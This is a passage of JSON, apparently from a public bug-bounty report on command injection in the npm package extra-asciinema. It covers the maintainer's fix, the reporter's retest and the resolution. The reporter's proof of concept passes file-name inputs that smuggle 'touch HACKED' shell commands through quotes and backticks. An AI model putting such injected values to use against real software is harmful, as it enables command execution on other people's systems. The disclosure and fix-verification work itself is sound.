class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"o\"\u003e||\u003c/span\u003e\u003cspan class=\"p\"\u003e{};\u003c/span\u003e\n  \u003cspan class=\"c1\"\u003e// if input file given, execute on node.js\u003c/span\u003e\n  \u003cspan class=\"k\"\u003eif\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003epth\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003eescapePath\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003edir\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003edirname\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epth\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"kd\"\u003evar\u003c/span\u003e \u003cspan class=\"nx\"\u003efil\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003epath\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ebasename\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nx\"\u003epth\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n    \u003cspan class=\"nx\"\u003eo\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003ecommand\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"s2\"\u003e`cd \u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003edir\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot; \u0026amp;\u0026amp; cat \u0026quot;\u003c/span\u003e\u003cspan class=\"p\"\u003e${\u003c/span\u003e\u003cspan class=\"nx\"\u003efil\u003c/span\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026quot; | node -i`\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n  \u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e","automated_response":false,"created_at":"2020-07-26T18:56:02.495Z","updated_at":"2020-07-26T18:56:02.495Z","actor":{"username":"wolfram77","cleared":false,"url":"/wolfram77","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8990302,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"@d3lla i think this should be fixed too. you can mark it as done.","markdown_message":"\u003cp\u003e\u003ca href=\"/d3lla\"\u003e@d3lla\u003c/a\u003e i think this should be fixed too. you can mark it as done.\u003c/p\u003e\n","automated_response":false,"created_at":"2020-08-20T15:08:51.959Z","updated_at":"2020-08-20T15:08:51.959Z","actor":{"username":"wolfram77","cleared":false,"url":"/wolfram77","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9003372,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Hi @wolfram77,\n\nsorry for the late reply.\n\nYour changes seems to fix the problem.\nI run the previous poc:\n\n```javascript\nconst asciinema = require('extra-asciinema');\n// asciinema.uploadSync('; touch HACKED');'; touch HACKED\n\nasciinema.recSync('saved.cast', {input: '\"; touch HACKED1\"'});\nasciinema.recSync('saved.cast', {input: './`touch HACKED2`/../'});\nasciinema.rec('saved.cast', {input: '`touch HACKED3`'});\nasciinema.rec('saved.cast', {input: './`touch HACKED4`/../'});\n\n```\nand I was not able to reproduce the previous reported result.\n\nI attached a PoC video.\n{F958366}\n\nThanks for your time and have a nice day,\nd3lla\n\nI tested using the following configurations:\n\n- OPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\n- NODEJS VERSION: v14.2.0\n- NPM VERSION: 6.14.4","markdown_message":"\u003cp\u003eHi \u003ca href=\"/wolfram77\"\u003e@wolfram77\u003c/a\u003e,\u003c/p\u003e\n\n\u003cp\u003esorry for the late reply.\u003c/p\u003e\n\n\u003cp\u003eYour changes seems to fix the problem.\u003cbr\u003e\nI run the previous poc:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight javascript\"\u003e\u003ccode\u003e\u003cspan class=\"kd\"\u003econst\u003c/span\u003e \u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nx\"\u003erequire\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003eextra-asciinema\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003cspan class=\"c1\"\u003e// asciinema.uploadSync(\u0026#39;; touch HACKED\u0026#39;);\u0026#39;; touch HACKED\u003c/span\u003e\n\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erecSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esaved.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e\u0026quot;; touch HACKED1\u0026quot;\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erecSync\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esaved.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e./`touch HACKED2`/../\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esaved.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e`touch HACKED3`\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\u003cspan class=\"nx\"\u003easciinema\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"nx\"\u003erec\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003esaved.cast\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\u003cspan class=\"na\"\u003einput\u003c/span\u003e\u003cspan class=\"p\"\u003e:\u003c/span\u003e \u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"s1\"\u003e./`touch HACKED4`/../\u003c/span\u003e\u003cspan class=\"dl\"\u003e\u0026#39;\u003c/span\u003e\u003cspan class=\"p\"\u003e});\u003c/span\u003e\n\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eand I was not able to reproduce the previous reported result.\u003c/p\u003e\n\n\u003cp\u003eI attached a PoC video.\u003cbr\u003e\n\u003ca class=\"markdown-attachment-link markdown-attachment-inline-reference\" data-attachment-filename=\"fix_extra-asciinema_2.mov\" data-attachment-link=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EhnVAygkSjG9CL4Q89xYnjpi?response-content-disposition=attachment%3B%20filename%3D%22fix_extra-asciinema_2.mov%22%3B%20filename%2A%3DUTF-8%27%27fix_extra-asciinema_2.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070256Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026amp;X-Amz-Signature=588ac3f2235985a4d90cd9f580af046be2a0a2298c52db586ec0826f6734cb87\" data-attachment-type=\"video/quicktime\"\u003e\u003cvideo controls=\"controls\" src=\"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EhnVAygkSjG9CL4Q89xYnjpi?response-content-disposition=attachment%3B%20filename%3D%22fix_extra-asciinema_2.mov%22%3B%20filename%2A%3DUTF-8%27%27fix_extra-asciinema_2.mov\u0026amp;response-content-type=video%2Fquicktime\u0026amp;X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026amp;X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026amp;X-Amz-Date=20201229T070256Z\u0026amp;X-Amz-Expires=3600\u0026amp;X-Amz-SignedHeaders=host\u0026amp;X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026amp;X-Amz-Signature=588ac3f2235985a4d90cd9f580af046be2a0a2298c52db586ec0826f6734cb87\" class=\"markdown-inline-image\" style=\"display: inline-block\"\u003e\u003c/video\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eThanks for your time and have a nice day,\u003cbr\u003e\nd3lla\u003c/p\u003e\n\n\u003cp\u003eI tested using the following configurations:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eOPERATING SYSTEM VERSION: Ubuntu 18.04.4 LTS\u003c/li\u003e\n\u003cli\u003eNODEJS VERSION: v14.2.0\u003c/li\u003e\n\u003cli\u003eNPM VERSION: 6.14.4\u003c/li\u003e\n\u003c/ul\u003e\n","automated_response":false,"created_at":"2020-08-21T16:05:30.569Z","updated_at":"2020-08-21T16:05:30.569Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"attachments":[{"id":958366,"filename":"fix_extra-asciinema_2.mov","type":"video/quicktime","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/EhnVAygkSjG9CL4Q89xYnjpi?response-content-disposition=attachment%3B%20filename%3D%22fix_extra-asciinema_2.mov%22%3B%20filename%2A%3DUTF-8%27%27fix_extra-asciinema_2.mov\u0026response-content-type=video%2Fquicktime\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ7KWAVKN2%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T070256Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJ%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIQD1%2F98g6jqKF1gdjZ5ZeoLWwnKZTa7SodLIyHk4VOcB%2FAIgFI%2BEqMwMQ%2FjD3C0sLxiv4nCy8OqyFoWIlBFI%2B7p340cqtAMIWBABGgwwMTM2MTkyNzQ4NDkiDLOK9Idi7%2FUoNMuAPiqRA4am%2B6RTpiKhn1AwsjrB6XVphwW3DOpYDdxbLb1mT2RMVWnv7voT3st7PIVsZlzggyCnKW3IXFl%2FFthkC8hPlanzQkmqsI8gI9NrFIkXHcsU6zuBZqsO8kJpBRkDZV6sMJHVSi8%2BbCx0ndEqAxWtiQNEX9ZxsGY3oYwlNJuSJRCRTxAEZa%2F71VqYA4l%2FEDtta2G98a%2B7w0m5jApr8Q303FIRKKxa0v1BRrgwOLkTtlrwYHfTvtXbfeFgqn7%2BHoWj7PaL4nijFBwOZy5CamnMUxGIKtp%2BYcDtI6MF7AU96g8HTcws4xmsFvEX1PpFoqJ6pPB25animcHJSKOaWfi13jxruCpA2sEjEa5wYBPiAEjXsNuSMRG13lbKep614wfDsTpEclccjKRS1nvV9SdDrQ9sc3ShrBOma9kxdr7f7NlgtPwXtxsIJFAeGww%2FEf8UO6hWNOWOyrbxMbAnaAqqrnrRbk1jWalvw%2FjtPzY1MyJZOgqN%2FDhCJzNx7WK5g2KXirutlO9xT8Th8Kxo1yn2i5YtMJinq%2F8FOusBforza3WyzCtzDkxPUVgf%2FxQ15NxR1ETwaKHsZvjxMX9aYpJLOFGo%2BMGtzI5L2fk7Kf5VV8NN8613OzcsiaUpShf%2FlTw0vgtzwFLStO18BMV5XTjpPteD7Y5jDvGQOX9eT%2FO7RiQI5pl5HrSk8ro%2FZocyZggI%2Fl8T3c4A1Ck7lnCXaoa2vMcxhQ5BYEAWGLxnxh9xU%2F%2F6s8roQqOd3GXc1FXIo6%2FfoiCNFrI5ijLtwHbhYPva2%2Bzao%2BuwW%2B%2BdoXpmOtSl4DL0dAHzV7zPwTy%2FzZj9GjkQF3WslKg%2BmtzbBXB%2FBa5ccvA7dWjRnw%3D%3D\u0026X-Amz-Signature=588ac3f2235985a4d90cd9f580af046be2a0a2298c52db586ec0826f6734cb87"}],"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9005580,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-21T20:51:38.855Z","updated_at":"2020-08-21T20:51:38.855Z","actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"d3lla","url":"/d3lla"},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9005582,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-21T20:51:48.214Z","updated_at":"2020-08-21T20:51:48.214Z","first_to_agree":true,"actor":{"username":"danielruf","cleared":false,"url":"/danielruf","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/JjaMiHpqpLG3vx6VJMAA9KbK/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":9008029,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-22T08:48:20.119Z","updated_at":"2020-08-22T08:48:20.119Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9008030,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2020-08-22T08:48:20.160Z","updated_at":"2020-08-22T08:48:20.160Z","actor":{"username":"d3lla","cleared":false,"url":"/d3lla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"nodejs-ecosystem","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}